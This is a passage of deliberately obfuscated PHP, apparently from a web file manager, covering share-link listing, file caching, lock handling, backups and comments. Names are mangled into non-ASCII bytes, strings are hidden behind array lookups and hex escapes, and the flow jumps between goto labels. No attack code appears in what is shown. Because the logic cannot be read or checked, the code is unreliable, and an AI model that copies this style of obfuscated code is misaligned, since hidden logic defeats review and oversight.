$¹şããõ¨ = substr($³Úëğ¤º, strlen($Í¼¡õ€´)); if (substr($³Úëğ¤º, 0, strlen($Í¼¡õ€´)) != $Í¼¡õ€´) { return !1; } return $this->pathParse[$éî’Åø[1159]] . $éî’Åø[8] . ltrim($¹şããõ¨, $éî’Åø[8]); } public function getType() { $’è´ÑÒ— =& $_SERVER[Æ š¦İÈ]; $İ£­‹á© = str_replace($’è´ÑÒ—[74], $’è´ÑÒ—[12], get_class($this)); return strtolower($İ£­‹á©); } public function isTypeObject($¼Ñ¸Ü¬) { return IO::isTypeObject($¼Ñ¸Ü¬); } public function info($õøÇµáï) { return $this->infoParse($õøÇµáï); } public function infoAuth($ş¯ƒç·ª) { return $this->infoParse($ş¯ƒç·ª); } public function infoWithChildren($ŸÌ™‹) { return $this->infoParse($ŸÌ™‹, !0); } public function infoFull($«¯Ù€À¬) { return $this->infoParse($«¯Ù€À¬); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÚÊ—¤Ó) { $this->pathParse = $ÚÊ—¤Ó; } protected function infoParse($ÖÙãğ…Ø, $áª²Åï™ = false) { $¿ì×ŸÂ =& $_SERVER[Æ š¦İÈ]; return Action($¿ì×ŸÂ[1164])->sharePathInfo($this->pathParse[$¿ì×ŸÂ[78]], !0, $áª²Åï™); } public function listPath($Ïø×” , $Âã§Æâ¹ = false) { $Ğº½Ú ¨ =& $_SERVER[Æ š¦İÈ]; $öã–ĞÇñ = IO::listPath($Ïø×” , $Âã§Æâ¹); if (!$öã–ĞÇñ) { return $öã–ĞÇñ; } if (is_array($öã–ĞÇñ[$Ğº½Ú ¨[1325]])) { $ÕõÜ£çŞ = Action($Ğº½Ú ¨[1334])->parsePathChildren($öã–ĞÇñ[$Ğº½Ú ¨[1325]], array($Ğº½Ú ¨[424] => $Ïø×” )); $öã–ĞÇñ[$Ğº½Ú ¨[1325]] = Action($Ğº½Ú ¨[1164])->shareItemInfo($ÕõÜ£çŞ); } foreach ($öã–ĞÇñ as $ı§ÛêÌ => $Š…ú¦ä) { if (!in_array($ı§ÛêÌ, array($Ğº½Ú ¨[76], $Ğº½Ú ¨[77]))) { continue; } foreach ($Š…ú¦ä as $˜Ğ˜¾Èş => $ÕõÜ£çŞ) { $ÕõÜ£çŞ = Action($Ğº½Ú ¨[1334])->parsePathChildren($ÕõÜ£çŞ, array($Ğº½Ú ¨[424] => $Ïø×” )); $öã–ĞÇñ[$ı§ÛêÌ][$˜Ğ˜¾Èş] = Action($Ğº½Ú ¨[1164])->shareItemInfo($ÕõÜ£çŞ); } } return $öã–ĞÇñ; } public function listAll($ü«”ÄÀ) { $“›µŸğ¦ =& $_SERVER[Æ š¦İÈ]; $¾‡’™¨ = IO::listAll($ü«”ÄÀ); foreach ($¾‡’™¨ as &$Õú…ÌÏ¾) { $ò§©È“Ø = IO::info($Õú…ÌÏ¾[$“›µŸğ¦[78]]); $ò§©È“Ø = is_array($ò§©È“Ø) ? $ò§©È“Ø : array(); $Õú…ÌÏ¾ = array_merge($ò§©È“Ø, $Õú…ÌÏ¾); $Õú…ÌÏ¾[$“›µŸğ¦[87]] = Action($“›µŸğ¦[1164])->shareItemInfo($Õú…ÌÏ¾); } unset($Õú…ÌÏ¾); return $¾‡’™¨; } } goto C­ŒÑâ; e‚øóÎ¸«ó: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($õ³ºœõï, $½”ò†ìÓ) { $ùÂşÒÚ´ =& $_SERVER[Æ š¦İÈ]; $this->cachePath = $õ³ºœõï[$ùÂşÒÚ´[78]]; $this->prefix = $ùÂşÒÚ´[831]; $this->cacheTime = $½”ò†ìÓ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ÄÕ¶„úÆ) { $Ïœ¯¹‡ =& $_SERVER[Æ š¦İÈ]; $ÄÕ¶„úÆ = str_replace(array($Ïœ¯¹‡[832], $Ïœ¯¹‡[98], $Ïœ¯¹‡[73]), $Ïœ¯¹‡[833], $ÄÕ¶„úÆ); return $this->cachePath . $Ïœ¯¹‡[834] . $ÄÕ¶„úÆ . $Ïœ¯¹‡[835]; } public function set($Æ×‡†ÕŠ, $†Ÿó—ë, $Ì­˜ŒÍš = false) { $ÁöÌğèÆ = $this->getFile($Æ×‡†ÕŠ); if (file_put_contents($ÁöÌğèÆ, $this->prefix . $†Ÿó—ë, LOCK_EX)) { @touch($ÁöÌğèÆ, intval(time() + $Ì­˜ŒÍš)); clearstatcache(); return !0; } @unlink($ÁöÌğèÆ); return !1; } public function get($Ì‡·ÍØÛ) { $¿õÛáÉ = $this->getFile($Ì‡·ÍØÛ); if (file_exists($¿õÛáÉ) && filemtime($¿õÛáÉ) < time()) { @unlink($¿õÛáÉ); return !1; } $ºş™Õö = @file_get_contents($¿õÛáÉ); return substr($ºş™Õö, strlen($this->prefix)); } public function remove($¶ØË›™Ğ) { $½®ÇæüŞ = $this->getFile($¶ØË›™Ğ); return @unlink($½®ÇæüŞ); } public function deleteAll() { $‘öê†® =& $_SERVER[Æ š¦İÈ]; $¿İ‡Ê” = scandir($this->cachePath); foreach ($¿İ‡Ê” as $µÛÙ÷§Ñ) { $¥ñÃ÷¤  = $this->cachePath . $µÛÙ÷§Ñ; if (strpos($¥ñÃ÷¤ , $‘öê†®[835]) && strpos($¥ñÃ÷¤ , $‘öê†®[836])) { @unlink($¥ñÃ÷¤ ); } } } public function clearTimeout() { $ğº…Ã³ =& $_SERVER[Æ š¦İÈ]; $¡¤¡ÕÀâ = scandir($this->cachePath); foreach ($¡¤¡ÕÀâ as $š ³´®£) { $Øåó´Ë” = $this->cachePath . $š ³´®£; if (strpos($Øåó´Ë”, $ğº…Ã³[835]) && strpos($Øåó´Ë”, $ğº…Ã³[836]) && filemtime($Øåó´Ë”) < time()) { @unlink($Øåó´Ë”); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $èàûçş• =& $_SERVER[Æ š¦İÈ]; if (self::$handle) { return self::$handle; } $«º³·ùà = $GLOBALS[$èàûçş•[6]][$èàûçş•[346]]; self::$timeout = $«º³·ùà[$èàûçş•[837]] ? $«º³·ùà[$èàûçş•[837]] : 10; $Şğ‡’ÙÄ = _get($GLOBALS[$èàûçş•[6]], $èàûçş•[838]); $‚áŒ¾£ = $«º³·ùà[$èàûçş•[824]] ? $«º³·ùà[$èàûçş•[824]] : $èàûçş•[194]; if ($‚áŒ¾£ == $èàûçş•[21] && $Şğ‡’ÙÄ == $èàûçş•[13]) { $‚áŒ¾£ = $èàûçş•[194]; } switch ($‚áŒ¾£) { case $èàûçş•[827]: self::$handle = new CacheLockRedis(); break; case $èàûçş•[828]: self::$handle = new CacheLockMemcached(); break; case $èàûçş•[21]: self::$handle = new CacheLockDatabase(); break; case $èàûçş•[194]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($èàûçş•[839], $èàûçş•[840]); } return self::$handle; } private static function key($ëÃÔ‰õ) { return $_SERVER[Æ š¦İÈ][841] . Cache::key($ëÃÔ‰õ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($åÏ™Á¨ = '') { self::$errorMsg = $åÏ™Á¨; } public static function lockGlobal($Æ£¾´è÷, $ÚÀß¢÷) { return self::lock($Æ£¾´è÷, $ÚÀß¢÷, !0); } public static function lock($ñ ”¯Ó, $Ìª§ÃÀ = false, $“û—‰•‘ = false) { $ŸñÂ‘Şı =& $_SERVER[Æ š¦İÈ]; $›üé¥Ñ = self::init(); $êäŞŞ¤´ = self::key($ñ ”¯Ó); $Ìª§ÃÀ = $Ìª§ÃÀ ? $Ìª§ÃÀ : self::$timeout; $Ä±·û¸½ = $›üé¥Ñ->lock($êäŞŞ¤´, $Ìª§ÃÀ); $§ó»Ä = timeFloat(); if (!$Ä±·û¸½) { $İÄª”íœ = "\x6c\157\x63\153\40\145\162\162\157\x72\x3b\x6b\x65\171\75{$ñ ”¯Ó}\73\164\151\155\x65\x3d{$Ìª§ÃÀ}\x3b" . self::$errorMsg . $ŸñÂ‘Şı[71] . get_caller_msg(); $­–İ³û = LNG($ŸñÂ‘Şı[842]) . "\x28{$Ìª§ÃÀ}\163\x29\56" . LNG($ŸñÂ‘Şı[843]); $­–İ³û .= $ŸñÂ‘Şı[844]; if (is_string(self::$errorMsg) && self::$errorMsg) { $­–İ³û = $­–İ³û . $ŸñÂ‘Şı[845] . self::$errorMsg; } write_log($İÄª”íœ, $ŸñÂ‘Şı[840]); show_json($­–İ³û, !1); } if (!$“û—‰•‘) { self::$lockItem[$êäŞŞ¤´] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $óßÜ‚† = number_format(timeFloat() - $§ó»Ä, 3); write_log($ŸñÂ‘Şı[846] . $ñ ”¯Ó . $ŸñÂ‘Şı[847] . $óßÜ‚†, $ŸñÂ‘Şı[840]); } return $Ä±·û¸½; } public static function lockGet($¿¦³÷³) { $½Ùº²ËÉ = self::key($¿¦³÷³); if (self::$lockItem[$½Ùº²ËÉ]) { return self::$lockItem[$½Ùº²ËÉ]; } return self::init()->lockGet($½Ùº²ËÉ); } public static function unlock($•£î€ù) { $…Óªé¢ =& $_SERVER[Æ š¦İÈ]; $…å½îı  = self::key($•£î€ù); self::$lockItem[$…å½îı ] = null; self::init()->unlock($…å½îı ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($…Óªé¢[848] . $•£î€ù, $…Óªé¢[840]); } return; } public static function unlockRuntime() { $ĞÈÅøÅ =& $_SERVER[Æ š¦İÈ]; $ÅÛÊ§ùö = self::init(); $ŸËµåŒ“ = !1; foreach (self::$lockItem as $ºç±‘ => $ƒ±ë™èí) { if (!$ƒ±ë™èí) { continue; } $ÅÛÊ§ùö->unlock($ºç±‘); if (!$ŸËµåŒ“) { $ŸËµåŒ“ = !0; write_log($ĞÈÅøÅ[849] . $ºç±‘ . $ĞÈÅøÅ[71] . get_caller_msg(), $ĞÈÅøÅ[840]); continue; } write_log($ĞÈÅøÅ[849] . $ºç±‘, $ĞÈÅøÅ[840]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ßÉˆĞÔ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ĞÈÅøÅ[850] . $ßÉˆĞÔ . $ĞÈÅøÅ[851] . ACTION, $ĞÈÅøÅ[840]); } } public static function fileLock($ŞÄÜ„£‹) { $ö¶í«ËÅ =& $_SERVER[Æ š¦İÈ]; if (!$GLOBALS[$ö¶í«ËÅ[852]]) { $GLOBALS[$ö¶í«ËÅ[852]] = array(); } $GLOBALS[$ö¶í«ËÅ[852]][$ŞÄÜ„£‹] = !1; $ìàÂ¹Ùì = fopen(DATA_PATH . $ŞÄÜ„£‹ . $ö¶í«ËÅ[853], $ö¶í«ËÅ[854]); if (!$ìàÂ¹Ùì) { return !1; } $GLOBALS[$ö¶í«ËÅ[852]][$ŞÄÜ„£‹] = $ìàÂ¹Ùì; if (flock($ìàÂ¹Ùì, LOCK_EX)) { return !0; } self::unlock($ŞÄÜ„£‹); show_json($ö¶í«ËÅ[855], !1); return !1; } public static function fileUnlock($‚éŠŸşŸ) { $¨½ºÖå =& $_SERVER[Æ š¦İÈ]; $â½À†ß = $GLOBALS[$¨½ºÖå[852]][$‚éŠŸşŸ]; if (!$â½À†ß) { return; } $GLOBALS[$¨½ºÖå[852]][$‚éŠŸşŸ] = !1; flock($â½À†ß, LOCK_UN); fclose($â½À†ß); } public static function fileUnlockAll() { $ø„ùŒú =& $_SERVER[Æ š¦İÈ]; if (!$GLOBALS[$ø„ùŒú[852]]) { return; } foreach ($GLOBALS[$ø„ùŒú[852]] as $…´»Æß» => $ùÓ”¶¨è) { if (!$ùÓ”¶¨è) { continue; } $GLOBALS[$ø„ùŒú[852]][$…´»Æß»] = !1; flock($ùÓ”¶¨è, LOCK_UN); fclose($ùÓ”¶¨è); } $GLOBALS[$ø„ùŒú[852]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto dåÓï¤©çÑ; FÇËØêñËğ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\142\141\x63\153\x75\160\x4c\151\x73\x74"; public $field = array("\x69\157", "\156\141\155\x65", "\x73\x74\x61\164\165\163", "\x63\157\x6e\164\x65\x6e\164", "\x6d\141\156\x75\x61\154", "\162\145\163\x75\x6c\164", "\164\x69\x6d\145\106\162\x6f\x6d", "\164\151\155\x65\x54\x6f"); public function config() { $·áû”“« =& $_SERVER[Æ š¦İÈ]; $—“××Ú = Model($·áû”“«[767])->get($·áû”“«[777]); $—“××Ú = json_decode($—“××Ú, !0); $—“××Ú = is_array($—“××Ú) ? $—“××Ú : array(); if (!isset($—“××Ú[$·áû”“«[752]])) { $—“××Ú[$·áû”“«[752]] = $·áû”“«[89]; } unset($—“××Ú[$·áû”“«[1614]]); Action($·áû”“«[1836])->taskInit(); Model($·áû”“«[1613])->cacheClear(); $¢óºäŠÀ = $·áû”“«[1837]; $ŸÙŸ©Â = Model($·áû”“«[1838])->findByKey($·áû”“«[1632], $¢óºäŠÀ); if (!$ŸÙŸ©Â) { $ŸÙŸ©Â = array(); } if (isset($ŸÙŸ©Â[$·áû”“«[198]])) { $ŸÙŸ©Â[$·áû”“«[198]] = json_decode($ŸÙŸ©Â[$·áû”“«[198]], !0); } if (isset($—“××Ú[$·áû”“«[198]])) { $ŸÙŸ©Â[$·áû”“«[198]][$·áû”“«[1617]] = $—“××Ú[$·áû”“«[198]]; unset($—“××Ú[$·áû”“«[198]]); } return array_merge($ŸÙŸ©Â, $—“××Ú); } public function listData($•áÁš¨÷ = false, $£€Àƒ¼” = "\x6d\x6f\144\x69\x66\171\x54\x69\x6d\145", $Îšâôâ¿ = false) { return parent::listData($•áÁš¨÷, $£€Àƒ¼”, !0); } public function lastItem() { $ÇËš¤©í = $this->listData(); return !empty($ÇËš¤©í[0]) ? $ÇËš¤©í[0] : null; } public function kill($”Ç—–€å) { $ØÊŞşÈœ =& $_SERVER[Æ š¦İÈ]; $…ÌÌ¼¨ê = $this->listData($”Ç—–€å); if (!$…ÌÌ¼¨ê || empty($…ÌÌ¼¨ê[$ØÊŞşÈœ[32]])) { return !0; } Task::kill($ØÊŞşÈœ[776]); Task::kill($ØÊŞşÈœ[797]); Task::kill($ØÊŞşÈœ[806]); $ü°šñ” = $…ÌÌ¼¨ê[$ØÊŞşÈœ[32]]; $ËÕô™Ä¯ = TEMP_FILES . $ØÊŞşÈœ[775] . $ü°šñ” . $ØÊŞşÈœ[8]; IO::remove($ËÕô™Ä¯, !1); return $this->remove($”Ç—–€å); } public function remove($·£ğ¥ºº) { $•Éçğ» = $this->listData($·£ğ¥ºº); if (!$•Éçğ») { return !0; } return $this->backupRemove($•Éçğ»); } private function backupRemove($ì­°†Äğ) { parent::remove($ì­°†Äğ[$_SERVER[Æ š¦İÈ][403]]); $¯Å‡²øº = $this->backupPath($ì­°†Äğ); IO::remove($¯Å‡²øº, !1); return !0; } private function backupPath($Üù¹¨šˆ) { $œä½®‘ =& $_SERVER[Æ š¦İÈ]; $™û—œüó = $Üù¹¨šˆ[$œä½®‘[32]]; $¬ÁÛøµŠ = Model($œä½®‘[767])->get($œä½®‘[768]); $Úõ’íÆÆ = substr(md5($œä½®‘[769] . $¬ÁÛøµŠ . $™û—œüó), 0, 8); return "\x7b\x69\x6f\x3a{$Üù¹¨šˆ[$œä½®‘[749]]}\175\57\x64\141\x74\141\142\141\163\x65\57\142\141\143\x6b\165\160\x2f" . $™û—œüó . $œä½®‘[11] . $Úõ’íÆÆ; } public function start() { $úÕÚ†õÉ =& $_SERVER[Æ š¦İÈ]; if ($GLOBALS[$úÕÚ†õÉ[6]][$úÕÚ†õÉ[90]][$úÕÚ†õÉ[1839]] != $úÕÚ†õÉ[89]) { return !0; } $˜ú•é¢¡ = $this->config(); if (!$˜ú•é¢¡ || $˜ú•é¢¡[$úÕÚ†õÉ[1614]] != $úÕÚ†õÉ[89]) { return !1; } $‹±¿ÀÌ = $this->process(); foreach ($‹±¿ÀÌ as $è¥íÃŸ) { if ($è¥íÃŸ) { return Task::restart($è¥íÃŸ[$úÕÚ†õÉ[403]]); } } $Èî£¢ªµ = new Backup(); $¢à÷‘Å = $Èî£¢ªµ->db(); if ($¢à÷‘Å) { $¢à÷‘Å = $Èî£¢ªµ->dbFile(); if ($¢à÷‘Å && $˜ú•é¢¡[$úÕÚ†õÉ[752]] == $úÕÚ†õÉ[192]) { $¢à÷‘Å = $Èî£¢ªµ->file(); } } Backup::set(array($úÕÚ†õÉ[747] => 1, $úÕÚ†õÉ[498] => time())); return !0; } public function process() { $Ä¸…åÎ— =& $_SERVER[Æ š¦İÈ]; $äˆ¯Ä¼£ = array($Ä¸…åÎ—[755] => Task::get($Ä¸…åÎ—[776]), $Ä¸…åÎ—[759] => Task::get($Ä¸…åÎ—[797]), $Ä¸…åÎ—[194] => Task::get($Ä¸…åÎ—[806])); $›ÍœîÇ = !1; foreach ($äˆ¯Ä¼£ as &$ãÖä…åÇ) { if ($›ÍœîÇ) { $ãÖä…åÇ = !1; continue; } if ($ãÖä…åÇ) { $«é…Ş÷í = intval(_get($ãÖä…åÇ, $Ä¸…åÎ—[1649], 0)); if (time() - $«é…Ş÷í > 7200) { Task::kill($ãÖä…åÇ[$Ä¸…åÎ—[403]]); $›ÍœîÇ = !0; $ãÖä…åÇ = !1; } } } return $äˆ¯Ä¼£; } public function restore() { $ù¥®Ñı =& $_SERVER[Æ š¦İÈ]; ActionCall($ù¥®Ñı[1051], !0, 1); ActionCall($ù¥®Ñı[1051], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\x61\x6d\x65" => "\143\157\155\155\145\156\164\137\155\145\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\x64" => "\x63\157\155\155\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($×Çì®§Ø) { $é…”–» =& $_SERVER[Æ š¦İÈ]; if ($×Çì®§Ø[$é…”–»[1840]]) { $ª™±·Ùä = $this->where(array($é…”–»[1841] => $×Çì®§Ø[$é…”–»[1840]]))->find(); if (!$ª™±·Ùä || $ª™±·Ùä[$é…”–»[414]] != $×Çì®§Ø[$é…”–»[414]] || $ª™±·Ùä[$é…”–»[506]] != $×Çì®§Ø[$é…”–»[506]]) { return !1; } $this->where(array($é…”–»[1841] => $×Çì®§Ø[$é…”–»[1840]]))->setAdd($é…”–»[1842], 1); } $×Çì®§Ø[$é…”–»[1843]] = 0; $×Çì®§Ø[$é…”–»[1842]] = 0; $×Çì®§Ø[$é…”–»[747]] = 1; return $this->add($×Çì®§Ø); } public function commentCount($™Õï®Æö, $Ãô¸´¤ç, $í•º§Úø = false) { $êé²—İ— =& $_SERVER[Æ š¦İÈ]; if (!$™Õï®Æö) { return array(); } if (is_string($™Õï®Æö) || is_int($™Õï®Æö)) { $™Õï®Æö = array($™Õï®Æö); } $¹²å’Ÿ¨ = array($êé²—İ—[506], $êé²—İ—[1844] => $êé²—İ—[502]); $àœñ‡¤ = array($êé²—İ—[506] => array($êé²—İ—[7], $™Õï®Æö), $êé²—İ—[414] => $Ãô¸´¤ç); if ($í•º§Úø) { $àœñ‡¤[$êé²—İ—[1644]] = $í•º§Úø; } $­¦ñÖœÓ = $this->field($¹²å’Ÿ¨)->where($àœñ‡¤)->group($êé²—İ—[506])->select(); return array_to_keyvalue($­¦ñÖœÓ, $êé²—İ—[506], $êé²—İ—[502]); } public function starTarget($ö‹ªêß¦, $ËîğÈÚ¿) { $ãº¿ŠØÛ =& $_SERVER[Æ š¦İÈ]; $ïÈâÍ¡ = $ö‹ªêß¦ + self::TYPE_STAR_OFFSET; $¿şÄİó” = array($ãº¿ŠØÛ[1644] => USER_ID, $ãº¿ŠØÛ[414] => $ïÈâÍ¡, $ãº¿ŠØÛ[506] => $ËîğÈÚ¿); $å—µü¸Î = $this->where($¿şÄİó”)->find(); if ($å—µü¸Î) { return $this->where(array($ãº¿ŠØÛ[403] => $å—µü¸Î[$ãº¿ŠØÛ[403]]))->delete(); } $ôçœü»á = array($ãº¿ŠØÛ[1840] => 0, $ãº¿ŠØÛ[1644] => USER_ID, $ãº¿ŠØÛ[747] => 1, $ãº¿ŠØÛ[752] => $ãº¿ŠØÛ[12], $ãº¿ŠØÛ[414] => $ïÈâÍ¡, $ãº¿ŠØÛ[506] => $ËîğÈÚ¿, $ãº¿ŠØÛ[1843] => 0, $ãº¿ŠØÛ[1842] => 0); return $this->add($ôçœü»á); } public function starTargetCount($ãî«ßëì, $ÄÑì¦æÕ) { $ÀÃõû€€ =& $_SERVER[Æ š¦İÈ]; $ Ù…£ü¤ = $ÄÑì¦æÕ + self::TYPE_STAR_OFFSET; $ …³¢Òı = $this->commentCount($ãî«ßëì, $ Ù…£ü¤); $ ·â­êé = $this->commentCount($ãî«ßëì, $ Ù…£ü¤, USER_ID); return array($ÀÃõû€€[1845] => $ …³¢Òı, $ÀÃõû€€[1846] => $ ·â­êé); } public function starTargetUserList($ €Ç›èù, $¸Ëß¡ŒÓ) { $÷‘Ô¼ =& $_SERVER[Æ š¦İÈ]; $Ä¦õ‹á• = $ €Ç›èù + self::TYPE_STAR_OFFSET; $‘í¢·ëÁ = array($÷‘Ô¼[506] => $¸Ëß¡ŒÓ, $÷‘Ô¼[414] => $Ä¦õ‹á•); $‡áÑ—°€ = $this->where($‘í¢·ëÁ)->count(); $ôÇèù‹ = array($÷‘Ô¼[252] => $‡áÑ—°€, $÷‘Ô¼[1847] => array()); if (!$‡áÑ—°€) { return $ôÇèù‹; } $ãÔòõĞ = $this->field($÷‘Ô¼[1644])->where($‘í¢·ëÁ)->limit(500)->select(); $ãÔòõĞ = array_to_keyvalue($ãÔòõĞ, $÷‘Ô¼[12], $÷‘Ô¼[1644]); $ôÇèù‹[$÷‘Ô¼[1847]] = Model($÷‘Ô¼[515])->userListInfo($ãÔòõĞ); return $ôÇèù‹; } public function prasiseUserList($µáÈÛ¨¿) { $ï›­Ó =& $_SERVER[Æ š¦İÈ]; $¦¨±»­ = array($ï›­Ó[1848] => $µáÈÛ¨¿); $›…’³‰ = $this->where($¦¨±»­)->find(); $óÁÏ¸ú = _get($›…’³‰, $ï›­Ó[1843], 0); $³ğ–…¢ = array($ï›­Ó[252] => $óÁÏ¸ú, $ï›­Ó[1847] => array()); if (!$óÁÏ¸ú) { return $³ğ–…¢; } $üºê = Model($ï›­Ó[1849])->field($ï›­Ó[1644])->where($¦¨±»­)->limit(500)->select(); $üºê = array_to_keyvalue($üºê, $ï›­Ó[12], $ï›­Ó[1644]); $³ğ–…¢[$ï›­Ó[1847]] = Model($ï›­Ó[515])->userListInfo($üºê); return $³ğ–…¢; } public function remove($¸÷é¬éÕ) { $ ”ø°½ï =& $_SERVER[Æ š¦İÈ]; $˜ÓÆÚ‘‹ = array($ ”ø°½ï[1841] => $¸÷é¬éÕ); $¬®èØš = $this->where($˜ÓÆÚ‘‹)->find(); if ($¬®èØš[$ ”ø°½ï[1840]]) { $this->where(array($ ”ø°½ï[1841] => $¬®èØš[$ ”ø°½ï[1840]]))->setAdd($ ”ø°½ï[1842], -1); } return $this->where($˜ÓÆÚ‘‹)->delete(); } public function edit($è…Ÿ¹ÅÏ, $»¶óÔ‰™) { $¡ì€ãÄ£ =& $_SERVER[Æ š¦İÈ]; $È¦ñÔš† = array($¡ì€ãÄ£[1841] => $è…Ÿ¹ÅÏ); return $this->where($È¦ñÔš†)->save(array($¡ì€ãÄ£[1850] => $»¶óÔ‰™)); } public function prasise($š’ÒËí) { $‚‹ÜãøÍ =& $_SERVER[Æ š¦İÈ]; $‹¸şòïµ = Model($‚‹ÜãøÍ[1851]); $§¯Ù¾è® = array($‚‹ÜãøÍ[1841] => $š’ÒËí, $‚‹ÜãøÍ[1635] => USER_ID); $Ÿé¢§ë½ = $‹¸şòïµ->where($§¯Ù¾è®)->find(); if (!$Ÿé¢§ë½) { $‹¸şòïµ->add($§¯Ù¾è®); $ë¿±§©Ù = $this->where(array($‚‹ÜãøÍ[1841] => $š’ÒËí))->setAdd($‚‹ÜãøÍ[1843], 1); } else { $‹¸şòïµ->where($§¯Ù¾è®)->delete(); $ë¿±§©Ù = $this->where(array($‚‹ÜãøÍ[1841] => $š’ÒËí))->setAdd($‚‹ÜãøÍ[1843], -1); } return $ë¿±§©Ù; } public function targetInfo($óó¨ÏîØ, $ûùª¯“³) { $¥´³ºë =& $_SERVER[Æ š¦İÈ]; $¹ËÅô¢ = array($¥´³ºë[582] => $óó¨ÏîØ, $¥´³ºë[583] => $ûùª¯“³); $ÕìÁìå = $this->where($¹ËÅô¢)->count(); $ôùİÛê… = "\122\x49\x47\x48\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\x63\157\x6d\155\x65\156\164\x5f\160\x72\141\151\x73\x65\40\x73\164\x61\x72\x20\157\156\x20\x63\157\155\155\x65\x6e\x74\x2e\x63\157\x6d\155\145\156\164\x49\x44\40\75\x20\163\x74\x61\162\x2e\143\157\155\155\x65\x6e\164\111\x44"; $ÚºƒèñÍ = $this->alias($¥´³ºë[351])->where($¹ËÅô¢)->join($ôùİÛê…, $¥´³ºë[1852])->count(); $š¨üÉ‚ò = array($¥´³ºë[1853] => $ÕìÁìå, $¥´³ºë[1854] => $ÚºƒèñÍ); return $š¨üÉ‚ò; } public function listData($Ãø†éù) { $¨Ÿ‚€û =& $_SERVER[Æ š¦İÈ]; if (isset($Ãø†éù[$¨Ÿ‚€û[1855]])) { if ($Ãø†éù[$¨Ÿ‚€û[1855]]) { $Ãø†éù[$¨Ÿ‚€û[1848]] = array($¨Ÿ‚€û[1005], intval($Ãø†éù[$¨Ÿ‚€û[1855]])); } unset($Ãø†éù[$¨Ÿ‚€û[1855]]); } if (isset($Ãø†éù[$¨Ÿ‚€û[1856]])) { if ($Ãø†éù[$¨Ÿ‚€û[1856]]) { $Ãø†éù[$¨Ÿ‚€û[1848]] = array($¨Ÿ‚€û[1002], intval($Ãø†éù[$¨Ÿ‚€û[1856]])); } unset($Ãø†éù[$¨Ÿ‚€û[1856]]); } return $this->_listData($Ãø†éù); } private function _listData($»²ÍÍÕ‚) { $×áí¹³µ =& $_SERVER[Æ š¦İÈ]; $Ÿ³¤šÊî = $this->where($»²ÍÍÕ‚)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ÿ³¤šÊî[$×áí¹³µ[366]]); $this->_listAppendUser($Ÿ³¤šÊî[$×áí¹³µ[366]]); $this->_listAppendMeta($Ÿ³¤šÊî[$×áí¹³µ[366]]); return $Ÿ³¤šÊî; } private function _makeOrder() { $ï´¦ŸôÆ =& $_SERVER[Æ š¦İÈ]; $úÏ•’¾‚ = array($ï´¦ŸôÆ[1843], $ï´¦ŸôÆ[1842], $ï´¦ŸôÆ[195]); $›ñ£íì• = Input::get($ï´¦ŸôÆ[457], $ï´¦ŸôÆ[7], $ï´¦ŸôÆ[426], $úÏ•’¾‚); $ó î…œ = Input::get($ï´¦ŸôÆ[458], $ï´¦ŸôÆ[7], $ï´¦ŸôÆ[1637], array($ï´¦ŸôÆ[1857], $ï´¦ŸôÆ[453])); $‡Î¦’öß = $›ñ£íì• . $ï´¦ŸôÆ[53] . $ó î…œ; return $this->order($‡Î¦’öß); } private function _listAppendParent(&$Ëö–“†ô) { $È£¥ãš£ =& $_SERVER[Æ š¦İÈ]; $€˜Ôœ‚ = array_unique(array_to_keyvalue($Ëö–“†ô, $È£¥ãš£[12], $È£¥ãš£[1840])); $€˜Ôœ‚ = array_remove_value($€˜Ôœ‚, $È£¥ãš£[192]); if (!$€˜Ôœ‚) { return; } $öµ»–† = $this->where(array($È£¥ãš£[1841] => array($È£¥ãš£[7], $€˜Ôœ‚)))->select(); $öµ»–† = array_to_keyvalue($öµ»–†, $È£¥ãš£[1848]); foreach ($Ëö–“†ô as &$‚şÛÁùâ) { if (isset($öµ»–†[$‚şÛÁùâ[$È£¥ãš£[1840]]])) { $‚şÛÁùâ[$È£¥ãš£[1858]] = $öµ»–†[$‚şÛÁùâ[$È£¥ãš£[1840]]]; } } unset($‚şÛÁùâ); } private function _listAppendUser(&$Ú®–Ôå¡) { $™ôÀ¹‘Ê =& $_SERVER[Æ š¦İÈ]; $„¢ú’µ• = array_unique(array_to_keyvalue($Ú®–Ôå¡, $™ôÀ¹‘Ê[12], $™ôÀ¹‘Ê[1644])); $„¢ú’µ• = array_remove_value($„¢ú’µ•, $™ôÀ¹‘Ê[192]); if (count($„¢ú’µ•) == 0) { return; } foreach ($Ú®–Ôå¡ as $ÈöˆÈ‹) { if (isset($ÈöˆÈ‹[$™ôÀ¹‘Ê[1858]])) { $„¢ú’µ•[] = $ÈöˆÈ‹[$™ôÀ¹‘Ê[1858]][$™ôÀ¹‘Ê[1644]]; } } $¼´³åéÉ = Model($™ôÀ¹‘Ê[540])->userListInfo($„¢ú’µ•); foreach ($Ú®–Ôå¡ as &$ÈöˆÈ‹) { $ÈöˆÈ‹[$™ôÀ¹‘Ê[596]] = $¼´³åéÉ[$ÈöˆÈ‹[$™ôÀ¹‘Ê[1644]]]; if (isset($ÈöˆÈ‹[$™ôÀ¹‘Ê[1858]])) { $ÈöˆÈ‹[$™ôÀ¹‘Ê[1858]][$™ôÀ¹‘Ê[596]] = 